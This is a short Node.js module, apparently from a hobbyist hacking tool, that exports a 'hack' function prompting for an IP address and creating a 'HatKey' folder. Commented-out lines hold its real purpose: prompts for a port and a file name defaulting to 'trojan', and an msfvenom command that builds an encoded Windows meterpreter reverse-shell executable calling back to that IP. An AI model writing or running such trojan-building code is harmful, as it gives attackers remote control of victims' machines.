const inquirer = require("inquirer");

exports.hack = (exec) => {
  inquirer
    .prompt([
      {
        type: "input",
        message: "Enter you ip address",
        name: "ip",
      },
    //   {
    //     type: "input",
    //     message: "Enter desired port",
    //     name: "port",
    //     default: "3333",
    //   },
    //   {
    //     type: "input",
    //     message: "Enter desired file name",
    //     name: "fileName",
    //     default: "trojan",
    //   },
    ])
    .then((response) => {
    //   const command = `sudo msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=${response.ip} LPORT=${response.port} -b x00 -e x86/shikata_ga_nai -f exe -o ../bin/${response.fileName}.exe`;
      var fs = require('fs');
      var dir = './HatKey';

     if (!fs.existsSync(dir)){
         fs.mkdirSync(dir);
        }
    //   exec(command, (error, stdout, stderr) => {
    //     console.log("stdout", stdout);
    //     console.log("stderr", stderr);
    //     if (error !== null) {
    //       console.log(error);
    //     }
    //   });
    // })
    // .catch((error) => {
    //   console.log(error);
     });
};
